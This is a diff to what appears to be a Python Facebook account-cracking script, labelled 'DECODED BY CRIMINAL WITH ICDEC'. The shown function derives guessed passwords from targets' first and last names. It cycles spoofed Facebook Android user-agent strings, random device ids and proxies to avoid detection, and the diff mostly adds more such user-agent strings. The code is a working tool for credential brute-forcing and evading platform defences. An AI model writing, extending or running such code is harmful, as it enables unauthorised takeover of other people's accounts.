@@ -1,4 +1,4 @@
-#DECODED BY CRIMINAL WITH ICDEC
+أ#DECODED BY CRIMINAL WITH ICDEC
 # OWNER  Achraf 
 import os,time,_md5,marshal,inspect,hashlib
 import http.client
@@ -484,11 +484,32 @@ def M_file_1(ids,names,passlist):
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                                 u1a =  "[FBAN/FB4A;FBAV/97.0.0.18.69;FBPN/com.facebook.katana;FBLC/en_US;FBBV/40442175;FBCR/Metro by T-Mobile;FBMF/Amazon;FBBD/amazon;FBDV/B08H8GVZHQ;FBSV/6.7.4;FBCA/x86:armeabi-v7a;FBDM/{density=1.625,width=1229,height=1788};]
+
 [FBAN/FB4A;FBAV/192.0.0.34.85;FBBV/126133156;FBDM/{density=2.5,width=433,height=1817};FBLC/en_AU;FBRV/126325250;FB_FW/2;FBCR/Engin Mobile;FBMF/Lenovo;FBBD/lenovo;FBPN/com.facebook.katana;FBDV/K8 Pro;FBSV/11.6.5;FBOP/1;FBCA/x86_64:armeabi-v7a;]
+
 [FBAN/FB4A;FBAV/405.0.0.23.72;FBPN/com.facebook.katana;FBLC/en_US;FBBV/440002512;FBCR/Straight Talk;FBMF/Nokia;FBBD/nokia;FBDV/TA-1403;FBSV/13.8.5;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=1.875,width=851,height=1814};FB_FW/1;FBRV/440407528;]
+
 [FBAN/FB4A;FBAV/114.0.0.20.70;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/51686724;FBCR/ALDI TALK Prepaid;FBMF/Lenovo;FBBD/lenovo;FBDV/K8 Note;FBSV/6.9.3;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=2.125,width=971,height=1605};]
+
 [FBAN/FB4A;FBAV/346.0.0.29.119;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/309216088;FBCR/Lycamobile Canada;FBMF/OPPO;FBBD/oppo;FBDV/CPH2107;FBSV/15.7.0;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=2.8,width=1372,height=2471};FB_FW/1;FBRV/309562175;]
-[FBAN/FB4A;FBAV/42.0.0.14.114;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/13879710;FBCR/OVO Mobile;FBMF/Lenovo;FBBD/lenovo;FBDV/K4 Note;FBSV/6.9.3;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=810,height=1220};FB_FW/1;FBRV/13921752;] FBBK/1[FBAN/FB4A;FBAV/229.0.0.35.117;FBPN/com.facebook.katana;FBLC/en_US;FBBV/162302402;FBCR/Freedom Wireless;FBMF/Motorola;FBBD/motorola;FBDV/XT2041-3;FBSV/11.9.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=3.8,width=572,height=2507};FB_FW/1;] FBBK/1
+
+[FBAN/FB4A;FBAV/42.0.0.14.114;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/13879710;FBCR/OVO Mobile;FBMF/Lenovo;FBBD/lenovo;FBDV/K4 Note;FBSV/6.9.3;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=810,height=1220};FB_FW/1;FBRV/13921752;] FBBK/1
+
+[FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/316416485;FBCR/Voxi;FBMF/LG;FBBD/lg;FBDV/LMX210EMW;FBSV/14.6.3;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.8,width=755,height=2083};]
+
+[FBAN/FB4A;FBAV/145.0.0.37.86;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/74851857;FBCR/Fido Solutions;FBMF/Samsung;FBBD/samsung;FBDV/SM-M115F;FBSV/9.9.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.2,width=1146,height=1099};]
+
+[FBAN/FB4A;FBAV/229.0.0.35.117;FBPN/com.facebook.katana;FBLC/en_US;FBBV/162302402;FBCR/Freedom Wireless;FBMF/Motorola;FBBD/motorola;FBDV/XT2041-3;FBSV/11.9.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=3.8,width=572,height=2507};FB_FW/1;] FBBK/1
+
+[FBAN/FB4A;FBAV/110.0.0.15.69;FBBV/49078465;FBDM/{density=2.125,width=1432,height=1744};FBLC/en_US;FBCR/T-Mobile;FBMF/Tecno;FBBD/tecno;FBPN/com.facebook.katana;FBDV/TB29;FBSV/7.7.0;FBCA/x86:arm64-v8a:armeabi-v7a;]
+
+[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/309617139;FBDM/{density=3.5,width=1383,height=1845};FBLC/de_DE;FBCR/O2 (Telefónica Germany);FBMF/LG;FBBD/lg;FBPN/com.facebook.katana;FBDV/LGK220;FBSV/14.5.4;FBCA/arm64-v8a:null;]
+
+[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895118;FBDM/{density=2.75,width=749,height=2178};FBLC/en_AU;FBRV/215165165;FB_FW/2;FBCR/Jeenee Mobile;FBMF/Vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Y20i;FBSV/9.9.0;FBOP/20;FBCA/arm64-v8a:armeabi-v7a:armeabi;]
+
+[FBAN/FB4A;FBAV/170.0.0.52.95;FBBV/105856850;FBDM/{density=2.25,width=505,height=871};FBLC/de_DE;FBCR/Congstar;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/G020P;FBSV/11.7.2;FBCA/x86:armeabi-v7a;]
+
+[FBAN/FB4A;FBAV/162.0.0.45.94;FBBV/95632808;FBDM/{density=1.25,width=1297,height=2329};FBLC/en_US;FBRV/95794877;FB_FW/2;FBCR/TracFone Wireless;FBMF/Lava;FBBD/lava;FBPN/com.facebook.katana;FBDV/A125;FBSV/10.8.5;FBOP/20;FBCA/arm64-v8a:armeabi-v7a:armeabi;]
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
